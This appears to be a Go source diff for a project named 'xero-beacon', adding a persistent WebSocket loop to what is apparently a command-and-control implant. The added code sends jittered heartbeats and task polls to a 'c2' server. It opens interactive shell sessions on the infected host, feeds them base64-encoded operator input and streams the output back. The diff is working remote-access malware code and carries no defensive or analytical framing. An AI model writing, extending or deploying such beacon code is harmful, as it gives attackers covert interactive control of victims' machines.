@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -13,11 +14,13 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
 	"xero-beacon/internal/config"
 	"xero-beacon/internal/protocolclient"
+	"xero-beacon/internal/session"
 	"xero-beacon/internal/shell"
 	"xero-beacon/internal/state"
 )
@@ -29,6 +32,7 @@ type Agent struct {
 	State  state.RuntimeState
 	Client *protocolclient.Client
 	HTTP   *http.Client
+	Shells *session.Manager
 }
 
 func New(cfg config.Config) (*Agent, error) {
@@ -45,6 +49,7 @@ func New(cfg config.Config) (*Agent, error) {
 		State:  runtimeState,
 		Client: protocol,
 		HTTP:   &http.Client{Timeout: 45 * time.Second},
+		Shells: session.NewManager(),
 	}, nil
 }
 
@@ -132,10 +137,16 @@ func (a *Agent) runWebSocketCycle(ctx context.Context) error {
 	if err != nil {
 		return err
 	}
-	return a.executeTaskFromACK(ctx, ack, func(payload map[string]any) error {
+	if err := a.executeTaskFromACK(ctx, ack, func(payload map[string]any) error {
 		_, err := a.sendAndReceive(conn, "TASK_RESULT", payload)
 		return err
-	})
+	}); err != nil {
+		return err
+	}
+	if cfg.Once {
+		return nil
+	}
+	return a.runWebSocketReadLoop(ctx, conn)
 }
 
 func (a *Agent) sendAndReceive(conn *websocket.Conn, messageType string, payload map[string]any) (map[string]any, error) {
@@ -158,6 +169,181 @@ func (a *Agent) sendAndReceive(conn *websocket.Conn, messageType string, payload
 		return nil, err
 	}
 	return decoded.Payload, nil
+}
+
+type lockedWebSocketWriter struct {
+	conn *websocket.Conn
+	mu   sync.Mutex
+}
+
+type websocketRead struct {
+	kind int
+	raw  []byte
+	err  error
+}
+
+func (a *Agent) runWebSocketReadLoop(ctx context.Context, conn *websocket.Conn) error {
+	writer := &lockedWebSocketWriter{conn: conn}
+	readCh := make(chan websocketRead, 1)
+	go func() {
+		for {
+			kind, raw, err := conn.ReadMessage()
+			readCh <- websocketRead{kind: kind, raw: raw, err: err}
+			if err != nil {
+				return
+			}
+		}
+	}()
+
+	interval := SleepDuration(a.cfg().SleepSeconds, a.cfg().Jitter)
+	ticker := time.NewTicker(interval)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-ctx.Done():
+			a.Shells.CloseAll("context_cancelled")
+			return ctx.Err()
+		case read := <-readCh:
+			if read.err != nil {
+				a.Shells.CloseAll("transport_closed")
+				return nil
+			}
+			if read.kind != websocket.BinaryMessage {
+				return errors.New("expected binary protocol frame")
+			}
+			decoded, err := a.Client.Decode(read.raw)
+			if err != nil {
+				return err
+			}
+			if err := a.handleWebSocketFrame(ctx, decoded.MessageType, decoded.Payload, writer); err != nil {
+				return err
+			}
+		case <-ticker.C:
+			if err := a.writeWebSocketFrame(writer, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
+				return err
+			}
+			if err := a.writeWebSocketFrame(writer, "TASK_POLL", map[string]any{"beacon_id": a.State.BeaconID}); err != nil {
+				return err
+			}
+		}
+	}
+}
+
+func (a *Agent) writeWebSocketFrame(writer *lockedWebSocketWriter, messageType string, payload map[string]any) error {
+	frame, err := a.Client.Encode(messageType, payload)
+	if err != nil {
+		return err
+	}
+	writer.mu.Lock()
+	defer writer.mu.Unlock()
+	return writer.conn.WriteMessage(websocket.BinaryMessage, frame)
+}
+
+func (a *Agent) handleWebSocketFrame(ctx context.Context, messageType string, payload map[string]any, writer *lockedWebSocketWriter) error {
+	switch messageType {
+	case "ACK":
+		return a.executeTaskFromACK(ctx, payload, func(result map[string]any) error {
+			return a.writeWebSocketFrame(writer, "TASK_RESULT", result)
+		})
+	case "SESSION_DATA":
+		return a.handleSessionData(ctx, payload, func(response map[string]any) error {
+			return a.writeWebSocketFrame(writer, "SESSION_DATA", response)
+		})
+	case "PROTOCOL_ERROR":
+		return fmt.Errorf("c2 protocol error: %v", payload["message"])
+	default:
+		return nil
+	}
+}
+
+func (a *Agent) handleSessionData(ctx context.Context, payload map[string]any, send func(map[string]any) error) error {
+	sessionID := stringValue(payload["session_id"])
+	op := stringValue(payload["op"])
+	if sessionID == "" {
+		return errors.New("SESSION_DATA missing session_id")
+	}
+	if op == "" {
+		return a.sendSessionData(sessionID, "error", map[string]any{"reason": "SESSION_DATA missing op"}, send)
+	}
+
+	switch op {
+	case "open":
+		shellType := stringValue(payload["shell_type"])
+		if shellType == "" {
+			shellType = "auto"
+		}
+		rows := numericInt(payload["rows"], 24)
+		cols := numericInt(payload["cols"], 80)
+		err := a.Shells.Open(ctx, sessionID, session.Options{ShellType: shellType, Rows: rows, Cols: cols}, func(event session.Event) {
+			_ = a.sendSessionEvent(sessionID, event, send)
+		})
+		if err != nil {
+			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
+		}
+		return a.sendSessionData(sessionID, "open_ack", map[string]any{"shell_type": shellType, "rows": rows, "cols": cols}, send)
+	case "stdin":
+		data, err := terminalData(payload)
+		if err != nil {
+			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
+		}
+		if err := a.Shells.Write(sessionID, data); err != nil {
+			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
+		}
+	case "resize":
+		rows := numericInt(payload["rows"], 24)
+		cols := numericInt(payload["cols"], 80)
+		if err := a.Shells.Resize(sessionID, rows, cols); err != nil {
+			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
+		}
+	case "close":
+		reason := stringValue(payload["reason"])
+		if reason == "" {
+			reason = "operator"
+		}
+		if err := a.Shells.Close(sessionID, reason); err != nil && !errors.Is(err, session.ErrUnknownSession) {
+			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
+		}
+		return a.sendSessionData(sessionID, "close", map[string]any{"reason": reason}, send)
+	default:
+		return a.sendSessionData(sessionID, "error", map[string]any{"reason": "unsupported SESSION_DATA op"}, send)
+	}
+	return nil
+}
+
+func (a *Agent) sendSessionEvent(sessionID string, event session.Event, send func(map[string]any) error) error {
+	fields := map[string]any{}
+	if len(event.Data) > 0 {
+		fields["data_b64"] = base64.StdEncoding.EncodeToString(event.Data)
+	}
+	if event.Reason != "" {
+		fields["reason"] = event.Reason
+	}
+	if event.Op == "exit" {
+		fields["exit_code"] = event.ExitCode
+	}
+	return a.sendSessionData(sessionID, event.Op, fields, send)
+}
+
+func (a *Agent) sendSessionData(sessionID string, op string, fields map[string]any, send func(map[string]any) error) error {
+	response := map[string]any{
+		"beacon_id":  a.State.BeaconID,
+		"session_id": sessionID,
+		"op":         op,
+	}
+	for key, value := range fields {
+		response[key] = value
+	}
+	return send(response)
+}
+
+func terminalData(payload map[string]any) ([]byte, error) {
+	if dataB64 := stringValue(payload["data_b64"]); dataB64 != "" {
+		return base64.StdEncoding.DecodeString(dataB64)
+	}
+	if data := stringValue(payload["data"]); data != "" {
+		return []byte(data), nil
+	}
+	return nil, errors.New("terminal input requires data")
 }
 
 func (a *Agent) runLongPollCycle(ctx context.Context) error {
@@ -471,6 +657,11 @@ func numericInt(value any, fallback int) int {
 	default:
 		return fallback
 	}
+}
+
+func stringValue(value any) string {
+	typed, _ := value.(string)
+	return strings.TrimSpace(typed)
 }
 
 func emptyToNil(value string) any {
